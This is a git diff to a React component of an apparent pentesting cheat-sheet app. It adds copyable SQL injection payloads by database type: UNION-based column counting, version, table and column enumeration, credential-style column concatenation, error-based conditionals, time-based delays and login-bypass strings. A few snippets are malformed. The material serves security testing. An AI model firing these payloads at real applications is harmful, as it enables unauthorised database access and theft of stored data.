31470bc48c2a9aaf8540b22c952ff680658238ba
riadh bouchahoua <r.bouchahoua@sysdream.com>
2021-11-18 18:47:32 +0100

    editing sqli snippets

--- src/components/web/SqlInjection.tsx
+++ src/components/web/SqlInjection.tsx
@@ -5,51 +5,124 @@ import QueueAnim from 'rc-queue-anim';
 const { Title, Paragraph } = Typography;
 
 export default function SQLi() {
+
+
+
+
+
+
+	const DbColumnNumber = [
+		{
+			db_type: 'MySQL/MSSQL/PGSQL',
+			title: "'UNION SELECT NULL,NULL,NULL -- -"
+		},
+		{
+			db_type: 'ORACLE',
+			title: "'UNION SELECT NULL,NULL,NULL FROM DUAL -- -"
+		},
+		{
+			db_type: 'MYSQL/MSSQL/PGSQL/ORACLE  - (add +1 until you get an exception)',
+			title: "' UNION ORDER BY 1 -- -"
+		},
+	]	
+
+	const DbVersionEnumeration = [
+		{
+			db_type: 'Mysql/MSsql', 
+			title: `' UNION SELECT @@version -- -`
+		},
+		{
+			db_type: 'Oracle',
+			title: `' UNION SELECT banner from v$version -- -`
+		},
+		{
+			db_type: 'Oracle(2nd method)',
+			title: `' UNION SELECT version from v$instance -- -`
+		},
+		{
+			db_type: 'Postgres',
+			title: `' UNION SELECT version() -- -`
+		}
+	]
+
+	const DbTableEnumeration = [
+		{
+			db_type: 'Mysql/MSsql/Postgres',
+			title: `' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -`
+		},
+		{
+			db_type: 'Oracle',
+			title: `' UNION SELECT table_name,NULL FROM all_tables  -- -`
+		},
+	]
+
+	const DbColumnEnumeration = [
+		{
+			db_type: 'Mysql/MSsql/Postgres',
+			title: `' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -`
+		},
+		{
+			db_type: 'Oracle',
+			title: `' UNION SELECT column_name,NULL FROM  where table_name="X"  -- -`
+		},
+	]
+
+	const DbColValueConcatenation = [
+		{
+			db_type: 'Mysql/Postgres',
+			title: `' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -`
+		},
+		{
+			db_type: 'Mysql(2nd method)',
+			title: `' UNION SELECT col1 ':' col2 from table_name limit 1 -- -`
+
+		},
+		{
+			db_type: 'Oracle / Postgres',
+			title: `' UNION SELECT select col1 ||':'||col2, null FROM  where table_name="X"  -- -`
+		},
+		{
+			db_type: 'MSsql',
+			title: `' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -`
+		},
+	]
+
+	const DbConditionalErrors = [
+		{
+			db_type: 'Mysql',
+			title: `' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -`
+		},
+		{
+			db_type: 'Postgres',
+			title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -`
+		},
+		{
+			db_type: 'Oracle',
+			title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -`
+		},
+		{
+			db_type: 'MSsql',
+			title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -`
+		},
+		
+	]
+
 	const BasicSql = [
-		{ title: "' or '" },
-		{ title: '-- or # ' },
+		{ title: "' or '1'='1" },
+		{ title: "); or 1=1 -- -" },
 		{ title: "' OR '1" },
-		{ title: "' OR 1 -- -" },
+		{ title: "' AND 1=1 -- -" },
 		{ title: ' OR "" = "' },
 		{ title: '" OR 1 = 1 -- -"' },
 		{ title: "' OR '' = '" },
-		{ title: "'='" },
-		{ title: "'LIKE'" },
-		{ title: "'=0--+" },
-		{ title: 'OR 1=1' },
-		{ title: "' OR 'x'='x" },
-		{ title: "' AND id IS NULL; --" },
-		{ title: "'''''''''''''UNION SELECT '2" }
 	];
 	const TimeBased = [
 		{ title: ',(select * from (select(sleep(10)))a)' },
-		{ title: '%2c(select%20*%20from%20(select(sleep(10)))a)' },
 		{ title: "';WAITFOR DELAY '0:0:30'--" }
 	];
-	const ErrorBased = [
-		{ title: 'OR 1=1' },
-		{ title: 'OR 1=1#' },
-		{ title: 'OR x=y#' },
-		{ title: 'OR 1=1-- ' },
-		{ title: 'OR x=x-- ' },
-		{ title: "OR 3409=3409 AND ('pytW' LIKE 'pytW" },
-		{ title: 'HAVING 1=1' },
-		{ title: 'HAVING 1=1#' },
-		{ title: 'HAVING 1=0-- ' },
-		{ title: 'AND 1=1-- ' },
-		{ title: "AND 1=1 AND '%'='" },
-		{ title: 'WHERE 1=1 AND 1=0--' },
-		{ title: "%' AND 8310=8310 AND '%'='" }
-	];
+	
 	const AuthBased = [
-		{ title: "' or ''-'" },
-		{ title: "' or '' '" },
-		{ title: "' or ''&'" },
-		{ title: "' or ''^'" },
-		{ title: "' or ''*'" },
 		{ title: 'or true--' },
-		{ title: '" or true--' },
-		{ title: "' or true--" },
 		{ title: '") or true--' },
 		{ title: "') or true--" },
 		{ title: "admin') or ('1'='1'--" },
@@ -86,17 +159,125 @@ export default function SQLi() {
 				and do other undesirable things by tricking the application into sending unexpected SQL commands.
 			</Paragraph>
 			<Divider dashed />
+
 			<div style={{ padding: 10, marginTop: 15 }} key='a'>
-				<Title level={3}>Generic SQL Injection Payloads</Title>
-				{BasicSql.map((k, i) => {
+				<Title level={3}>Number of column</Title>
+				{DbColumnNumber.map((k, i) => {
 					return (
-						<Paragraph key={i} copyable>
+						<>
+						<Paragraph key={i} style={{ margin: 15 }}>
+							<a href={`#${k.db_type}`}>{k.db_type}</a>
+						</Paragraph>
+
+						<Paragraph key={i} copyable editable ellipsis>
 							{k.title}
 						</Paragraph>
+						</>
 					);
 				})}
 			</div>
+
 			<Divider dashed />
+
+			<div style={{ padding: 10, marginTop: 15 }} key='a'>
+				<Title level={3}>Database enumeration</Title>
+				{DbVersionEnumeration.map((k, i) => {
+					return (
+						<>
+						<Paragraph key={i} style={{ margin: 15 }}>
+							<a href={`#${k.db_type}`}>{k.db_type}</a>
+						</Paragraph>
+
+						<Paragraph key={i} copyable editable ellipsis>
+							{k.title}
+						</Paragraph>
+						</>
+					);
+				})}
+			</div>
+			
+			<Divider dashed />
+
+			<div style={{ padding: 10, marginTop: 15 }} key='a'>
+				<Title level={3}>Tablename enumeration</Title>
+				{DbTableEnumeration.map((k, i) => {
+					return (
+						<>
+						<Paragraph key={i} style={{ margin: 15 }}>
+							<a href={`#${k.db_type}`}>{k.db_type}</a>
+						</Paragraph>
+
+						<Paragraph key={i} copyable editable ellipsis>
+							{k.title}
+						</Paragraph>
+						</>
+					);
+				})}
+			</div>
+
+
+			<Divider dashed />
+
+			<div style={{ padding: 10, marginTop: 15 }} key='a'>
+				<Title level={3}>Column name enumeration</Title>
+				{DbColumnEnumeration .map((k, i) => {
+					return (
+						<>
+						<Paragraph key={i} style={{ margin: 15 }}>
+							<a href={`#${k.db_type}`}>{k.db_type}</a>
+						</Paragraph>
+
+						<Paragraph key={i} copyable editable ellipsis>
+							{k.title}
+						</Paragraph>
+							</>
+					);
+				})}
+			</div>
+
+			<Divider dashed />
+
+			<div style={{ padding: 10, marginTop: 15 }} key='a'>
+				<Title level={3}>Column values concatenation</Title>
+				{DbColValueConcatenation.map((k, i) => {
+					return (
+						<>
+						<Paragraph key={i} style={{ margin: 15 }}>
+							<a href={`#${k.db_type}`}>{k.db_type}</a>
+						</Paragraph>
+
+						<Paragraph key={i} copyable editable ellipsis>
+							{k.title}
+						</Paragraph>
+						</>
+					);
+				})}
+			</div>
+
+			<Divider dashed />
+
+				<div style={{ padding: 10, marginTop: 15 }} key='a'>
+				<Title level={3}>Conditional ( Error Based ) </Title>
+				{DbConditionalErrors.map((k, i) => {
+					return (
+						<>
+						<Paragraph key={i} style={{ margin: 15 }}>
+							<a href={`#${k.db_type}`}>{k.db_type}</a>
+						</Paragraph>
+
+						<Paragraph key={i} copyable editable ellipsis>
+							{k.title}
+						</Paragraph>
+						</>
+					);
+				})}
+			</div>
+
+			<Divider dashed />
+		
+			
+
+
 			<div
 				key='b'
 				style={{
@@ -122,9 +303,10 @@ export default function SQLi() {
 				}}
 			>
 				<Title level={3}>Generic Error Based Payloads</Title>
-				{ErrorBased.map((k, i) => {
+				{DbConditionalErrors.map((k, i) => {
 					return (
 						<Paragraph key={i} copyable>
+							{k.db_type}
 							{k.title}
 						</Paragraph>
 					);
